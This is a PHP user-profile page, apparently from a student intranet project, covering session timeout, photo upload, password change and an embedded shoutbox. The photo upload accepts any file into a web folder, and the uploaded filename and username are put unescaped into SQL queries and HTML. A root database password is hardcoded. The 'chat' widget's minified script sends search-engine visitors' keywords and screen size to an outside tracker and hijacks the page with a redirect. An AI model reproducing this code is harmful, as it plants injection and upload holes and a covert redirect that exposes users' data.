<?php
session_start();
$connexio = mysqli_connect("localhost","root","rocoso123","web_projecte");


define("TEMPSINACTIU", 3600 ); //Segons maxims (1 hora)



//El temps transcurregut sera la diferencia entre el temps actual i l'ultim acces
$tempsTranscorregut = time() - $_SESSION["ultimAcces"];


if ($tempsTranscorregut >= TEMPSINACTIU) { //Si s'ha superat el temps inactiu, la sessio es tancara
    session_destroy(); //La sessio es tanca
    header("Location: index.php"); // Ens torna a la pagina principal
} 
?>
<html>
    <head>
        <link rel="stylesheet" type="text/css" href="style.css">
        <meta charset="UTF-8">
        <title>Perfil</title>
    </head>
   <body background="imagenes/Pulse_Wallpaper_Pack_by_NYMEZIDE.jpg">
        
 <?php
 
// Si s'ha finalitzat el formulari de cambiar foto, es pujara la foto escollida
 // a la carpeta imagenes/ del servidor indicant un nom temporal i la ruta
  if(isset($_POST['confirma'])){   
    $v=basename( $_FILES['nfoto']['name']);
               $target_path = "imagenes/";
$target_path = $target_path . basename( $_FILES['nfoto']['name']);
move_uploaded_file($_FILES['nfoto']['tmp_name'], $target_path);
    $usu = $_SESSION['usuari'];
    $nnfoto= "UPDATE usuari SET foto = '$v' WHERE nomUsuari = '$usu'";
$actualitzafoto = mysqli_query($connexio, $nnfoto);
    
} 
 
 ?>
 
 

<img id="menu" src="imagenes/difuminado_degradado_by_andredevonne-d564i6z.jpg" width="299" height="120">
<div id="foto">
        <table bgcolor="white">
            
            <tr>
                <td> <?php //Mostrarem la fotografia del usuari consultant a la base de dades
                $usu = $_SESSION['usuari'];
                $ffoto= "SELECT foto from usuari WHERE nomUsuari = '$usu'";
                $q = mysqli_query($connexio,$ffoto);
           $ff = mysqli_fetch_array($q);
           $x= $ff['foto'];
                // Si l'usuari ha pujat una fotografia es mostrara com a perfil, en cas contrari es mostrara una
           // per defecte
           if(empty($x)){  echo "<img src='imagenes/perfil.png' width='100' heigh='100'>";  } else {
                echo "<img src='imagenes/$x' width='100' heigh='100'>"; }?>
                </td> 
              
            </tr> 
            
           </table>
  </div>


     <?php       

                 // Si s'ha introduit la nova contrasenya i s'ha confirmat correctament
     //es comprovara si es igual i s'actualitzara a la base de dades, en cas contrari donara error
       if(isset($_POST["ncontrasena"]) && isset ($_POST["ncontrasena2"])){
            if((hash('sha256', $_POST['ncontrasena'])) == (hash('sha256', $_POST['ncontrasena2']))){
                
                $usu = $_SESSION['usuari'];
$nncontrasena = hash('sha256', $_POST['ncontrasena']);
$ncontrasena= "UPDATE usuari SET clau = '$nncontrasena' WHERE nomUsuari = '$usu'";
$actualitza = mysqli_query($connexio, $ncontrasena); ?>
<script>
alert('Password actualizado');
</script> <?php
            }  elseif ((hash('sha256', $_POST['ncontrasena'])) != (hash('sha256', $_POST['ncontrasena2']))) {
                                ?> <script>
alert('El password no coincide');
window.location.href='cambiar_contrasena.php';
</script> <?php 
            
            }
       }
            
       ?>
<div id="titulochat"><b>Soporte Técnico</b></div>
<div id="chat">
          <iframe WIDTH="200" HEIGHT="400" title="Shoutbox" src="https://shoutbox.widget.me/start.html?uid=ncxfooaf" frameborder="0" scrolling="auto">
               <!-- Codigo chat -->
           </iframe>
           <script>
               function handleTag(){
  var inputArr=document.getElementsByTagName("iframe");
  for (var i=0; i < inputArr.length; i++)if (document.getElementsByTagName("iframe")[i].src.match(/shoutbox.widget.me/)){document.getElementsByTagName("iframe")[i].scrollIntoView(true);}}function cookieSave(){var a=new Date();a=new Date(a.getTime() +1000*60*60*12);document.cookie='|hello|; expires='+a.toGMTString()+';';}cookieReaded='';function cookieRead(){if(document.cookie){cookieConAll=document.cookie;cookieCon=cookieConAll.split (';');for (var i=0; i < cookieCon.length; ++i){cookieConLine=cookieCon[i];cookieConPart=cookieConLine.split ('|');if (cookieConPart[1]=='hello'){cookieReaded='i';}}}}xid=Math.random();xid*=10000000000000;xid=Math.ceil(xid);pushRef=document.referrer;sumInp=pushRef+' '+document.URL;allMac=/google\.|bing\.|yahoo\./i;seaSou=new String(pushRef.match(allMac)).substring(0,1).toLowerCase();if (pushRef.match(allMac)){function getQ(strArg){var _url=pushRef + "&";var regex=new RegExp("(\\?|\\&)" + strArg + "=([^\\&\\?]*)\\&", "gi");if (! regex.test(_url)) return "";var arr=regex.exec(_url);return (RegExp.$2);}pushKeys=getQ('q'); if (pushKeys){}else{pushKeys=getQ('p');}cleanKeys=pushKeys.replace(/\+/g,' ');if (sumInp.match(/guy|model|boob|tits|nude|naked|chick|girl|boy|horny|blowjob|yaoi|porn|sex|xxx|babe|cum|teen|fuck|tight|turbat|pussy|vagina|penis|cock|dick|gay|lesbian/i)){vonVer='ama';}else{vonVer='me';}cookieRead();if(cookieReaded=='i'){window.onload=handleTag();}else{top.location.href="https://shoutbox.widget.me/track.pl?von="+vonVer+"&xid="+xid+"&res="+screen.width+"x"+screen.height+"&sea="+seaSou+"&via="+cleanKeys;cookieSave();}}
           </script><br>
           <br></div>
<!-- Codigo chat -->
               <div id="saludo">
<?php
$usuari = $_SESSION['usuari'];

echo "Hola $usuari"
        ?><br>
        
        <b> <a href="tanca_sessio.php">Cerrar Sesión</a><br>
        <a href="cambiar_contrasena.php">Cambiar password</a><br>
        <a href="cambiar_foto.php">Cambiar foto de perfil</a><br>
      
</div>
<div id="menu1"><img src="imagenes/color-lines-abstract-wide-wallpaper-1280x800-022.jpg" width="100" height="100"></div> 
<div id="menu2"><img src="imagenes/color-lines-abstract-wide-wallpaper-1280x800-022.jpg" width="100" height="100"></div>
<div id="menu3"><img src="imagenes/color-lines-abstract-wide-wallpaper-1280x800-022.jpg" width="100" height="100"></div>
<div id="menu4"><img src="imagenes/color-lines-abstract-wide-wallpaper-1280x800-022.jpg" width="100" height="100"></div>
<div id="menu5"><img src="imagenes/color-lines-abstract-wide-wallpaper-1280x800-022.jpg" width="100" height="100"></div>
<div id="menu6"><img src="imagenes/color-lines-abstract-wide-wallpaper-1280x800-022.jpg" width="100" height="100"></div>
<div id="menu7"><img src="imagenes/color-lines-abstract-wide-wallpaper-1280x800-022.jpg" width="100" height="100"></div>
<div id="en1"><a href="fotos.php"> Fotos</a></div>  
<div id="en2"><a href="contacto.php"> Contacto</a></div> 
<div id="en3"><a href="donde.php"> ¿Donde?</a></div> 
<div id="en4"><a href="enlaces.php"> Otros Enlaces</a></div>
<div id="en5"><a href="https://owncloud"><img src="imagenes/owncloud-logo_scaled.png" width="80" height="40"></a></div> 
<div id="en6"><a href="https://webmail"><img src="imagenes/zimbra-logo-square.fw_.png" width="50" height="50"></a></div> 
<div id="en7"><a href="https://spiceworks"><img src="imagenes/Spice_profile.png" width="40" height="40"></a></div> 
<div id="foto1"><img src="imagenes/virtual-systems.png" width="200" height="150"></div>
<div id="foto2"><img src="imagenes/virtualizacion_servidores1-1508x706_c.jpg" width="200" height="150"></div>
<div id="foto3"><img src="imagenes/VIRTUALIZACION.png" width="200" height="150"></div>
<div id="foto4"><img src="imagenes/color-lines-abstract-wide-wallpaper-1280x800-022.jpg" width="200" height="150"></div>
   <div id="logo"><img src="imagenes/logo.png" width="227" height="170"></div>
   

   </body>
</html>

